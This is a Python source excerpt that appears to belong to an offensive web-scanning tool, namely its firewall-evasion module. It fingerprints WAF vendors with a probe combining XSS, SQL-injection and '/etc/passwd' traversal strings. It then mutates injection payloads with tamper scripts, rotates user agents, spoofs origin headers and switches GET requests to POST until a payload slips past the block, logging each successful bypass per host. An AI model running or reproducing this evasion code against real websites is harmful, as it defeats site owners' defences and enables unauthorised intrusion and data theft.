def apply_tamper(name: str, payload: str) -> str:
    if "+" in name:
        cur = payload
        for part in name.split("+"):
            fn = TAMPER_SCRIPTS.get(part)
            if fn:
                cur = fn(cur)
        return cur
    fn = TAMPER_SCRIPTS.get(name)
    return fn(payload) if fn else payload


def prioritize_tampers(waf_vendors: list[str], vuln_class: str = "generic") -> list[str]:
    out = []
    vc = (vuln_class or "generic").lower()
    for key in ("sqli", "xss", "cmdi", "lfi", "ssrf"):
        if key in vc:
            out.extend(VULN_DEFAULT_TAMPERS[key])
            break
    for w in (waf_vendors or []):
        out.extend(WAF_TAMPER_PRIORITIES.get(w, []))
    out.extend(VULN_DEFAULT_TAMPERS["generic"])
    seen = set()
    dedup = []
    for x in out:
        if x not in seen:
            seen.add(x)
            dedup.append(x)
    return dedup


def sqlmap_tampers_for_wafs(wafs: list[str]) -> str:
    for w in (wafs or []):
        if w in SQLMAP_TAMPER_MAP:
            return SQLMAP_TAMPER_MAP[w]
    return SQLMAP_TAMPER_MAP["default"]


def is_waf_block(resp, baseline_status: int = 200) -> bool:
    if resp is None or resp.status == 0:
        return True
    if resp.status in (403, 406, 429, 444, 501, 503, 999) and baseline_status not in (403, 406, 503):
        return True
    body_l = (resp.text or "")[:4000].lower()
    if any(m in body_l for m in BLOCK_BODY_MARKERS):
        return True
    return False


def fingerprint_waf_response(resp) -> list[str]:
    if resp is None or resp.status == 0:
        return []
    found = []
    headers_l = {k.lower(): v.lower() for k, v in (resp.headers or {}).items()}
    cookies_str = headers_l.get("set-cookie", "")
    body_l = (resp.text or "")[:8000].lower()
    header_dump = " ".join(f"{k}:{v}" for k, v in headers_l.items())

    for vendor, sigs in WAF_SIGNATURES.items():
        matched = False
        for hk in sigs["headers"]:
            if hk in headers_l or hk in header_dump:
                matched = True
                break
        if not matched:
            for ck in sigs["cookies"]:
                if ck in cookies_str:
                    matched = True
                    break
        if not matched:
            for bm in sigs["body"]:
                if bm in body_l:
                    matched = True
                    break
        if matched:
            found.append(vendor)
    return found


def get_host_waf_profile(url: str, run_external_wafw00f: bool = False) -> dict:
    from core.http import get

    parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
    host = parsed.netloc
    with WAF_LOCK:
        if host in _HOST_WAF_CACHE and not run_external_wafw00f:
            return _HOST_WAF_CACHE[host]

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    clean_resp = get(base_url, headers=ORIGIN_SPOOF_HEADERS[0])
    noisy_url = base_url + ("&" if "?" in base_url else "?") + "wafprobe=" + urllib.parse.quote("<script>alert(1)</script>' UNION SELECT 1,2-- ../../../etc/passwd")
    noisy_resp = get(noisy_url)

    vendors = list(dict.fromkeys(fingerprint_waf_response(clean_resp) + fingerprint_waf_response(noisy_resp)))
    active_blocking = (clean_resp.status != 0) and is_waf_block(noisy_resp, clean_resp.status)
    if active_blocking and not vendors:
        vendors.append("generic_waf")

    if run_external_wafw00f:
        try:
            from tools.adapters import run_wafw00f
            ext = run_wafw00f(base_url)
            for v in ext.get("wafs", []):
                vn = v.lower().replace(" ", "_")
                if vn and vn not in vendors:
                    vendors.append(vn)
        except Exception:
            pass

    profile = {
        "host": host,
        "wafs": vendors,
        "blocking": active_blocking,
        "clean_status": clean_resp.status,
        "block_status": noisy_resp.status,
        "sqlmap_tampers": sqlmap_tampers_for_wafs(vendors),
    }
    with WAF_LOCK:
        _HOST_WAF_CACHE[host] = profile
    return profile


def inject_param(url: str, param: str, value: str) -> str:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param:
        qs[param] = [value]
    return parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()


def generate_waf_variants(payload: str, vuln_class: str = "generic", vendor: str = "generic", limit: int = 8) -> list[tuple[str, str]]:
    wafs = [vendor] if vendor and vendor != "generic" else []
    out = []
    for tname in prioritize_tampers(wafs, vuln_class=vuln_class):
        try:
            mut = apply_tamper(tname, payload)
        except Exception:
            continue
        if mut != payload:
            out.append((tname, mut))
            if len(out) >= limit:
                break
    return out


def probe_with_mutex_bypass(
    url: str,
    param: str,
    raw_payload: str,
    vuln_class: str = "generic",
    method: str = "GET",
    extra_params: dict | None = None,
    baseline_status: int = 200,
):
    from core.http import request

    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if extra_params:
        for k, v in extra_params.items():
            qs[k] = [v] if not isinstance(v, list) else v

    waf_info = get_host_waf_profile(url)
    wafs = waf_info.get("wafs", [])

    def _fire(pld: str, tamper_label: str, rotate_profile: bool = False, spoof_idx: int = -1):
        PAYLOAD_MUTEX.note_attempt(host)
        prof = select_browser_profile(host, force_rotate=rotate_profile)
        hdrs = dict(prof.get("headers", {}))
        hdrs["User-Agent"] = prof["ua"]
        if spoof_idx >= 0:
            hdrs.update(ORIGIN_SPOOF_HEADERS[spoof_idx % len(ORIGIN_SPOOF_HEADERS)])
        q = dict(qs)
        q[param] = [pld]
        if method.upper() == "POST":
            target_u = parsed._replace(query="").geturl()
            r = request("POST", target_u, data={k: v[0] if isinstance(v, list) else v for k, v in q.items()}, headers=hdrs)
        else:
            if tamper_label in ("url_encode", "double_url_encode", "charencode", "space2mysqlblank", "space2mssqlhash", "null_byte_prefix"):
                other = urllib.parse.urlencode({k: v for k, v in q.items() if k != param}, doseq=True)
                query_str = (other + "&" if other else "") + f"{urllib.parse.quote(param)}={pld}"
                target_u = parsed._replace(query=query_str).geturl()
            else:
                target_u = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = request("GET", target_u, headers=hdrs)
        return r, prof

    if not PAYLOAD_MUTEX.is_burned(host, vuln_class, raw_payload, "raw"):
        resp, prof = _fire(raw_payload, "raw", rotate_profile=False)
        if not is_waf_block(resp, baseline_status):
            return resp, raw_payload, ""
        PAYLOAD_MUTEX.record_failure(host, vuln_class, raw_payload, "raw", status=resp.status, ua=prof["ua"], reason="waf_block")

    mutations = PAYLOAD_MUTEX.next_mutations(host, vuln_class, raw_payload, waf_vendors=wafs, max_variants=6)
    last_resp = None
    for idx, (tname, mutated) in enumerate(mutations):
        resp, prof = _fire(mutated, tname, rotate_profile=True, spoof_idx=idx)
        last_resp = resp
        if not is_waf_block(resp, baseline_status):
            PAYLOAD_MUTEX.record_bypass_win(host, tname, profile=prof)
            return resp, mutated, f"tamper:{tname}+ua:{prof['name']}"
        PAYLOAD_MUTEX.record_failure(host, vuln_class, raw_payload, tname, status=resp.status, ua=prof["ua"], reason="waf_block_mutated")

    if method.upper() == "GET":
        prof = select_browser_profile(host, force_rotate=True)
        q_flat = {k: (v[0] if isinstance(v, list) else v) for k, v in qs.items()}
        q_flat[param] = raw_payload
        hdrs = dict(prof.get("headers", {}))
        hdrs["User-Agent"] = prof["ua"]
        hdrs.update(ORIGIN_SPOOF_HEADERS[0])
        post_resp = request("POST", parsed._replace(query="").geturl(), data=q_flat, headers=hdrs)
        if not is_waf_block(post_resp, baseline_status):
            PAYLOAD_MUTEX.record_bypass_win(host, "post_method_flip", profile=prof)
            return post_resp, raw_payload, f"method_flip:POST+ua:{prof['name']}"
        last_resp = post_resp

    if last_resp is not None:
        return last_resp, raw_payload, "blocked"
    resp, _ = _fire(raw_payload, "raw")
    return resp, raw_payload, ""
